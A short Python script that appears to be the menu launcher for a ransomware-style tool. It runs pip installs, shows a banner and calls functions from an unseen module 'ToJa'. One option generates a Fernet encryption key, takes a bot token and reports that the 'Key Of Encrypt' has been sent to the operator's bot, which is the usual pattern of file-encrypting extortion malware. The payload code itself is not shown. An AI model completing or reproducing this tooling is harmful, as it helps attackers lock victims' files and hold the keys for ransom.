import sys
from colorama import Fore
import ToJa
import banner
from cryptography.fernet import Fernet
import os

key2= Fernet.generate_key()

#Install Requirements
os.system("cls")
os.system("pip install --upgrade pip")
os.system("pip install -r requirements.txt")
#Finish Install Requirements

banner.banner()
banner.infolist1()

sel = input(Fore.LIGHTWHITE_EX+"--> ")
if int(sel) == 1:
    ToJa.soc1()
elif int(sel) == 2:
    ToJa.soc()
elif int(sel) == 3:
    token = input(Fore.RED+" Enter Your Bot Token : ")
    ToJa.soc2(token,str(key2))
    print(Fore.BLUE+" The Key Of Encrypt Is Sent To Your Bot! ")
    ToJa.soc3()
else:
    sys.exit()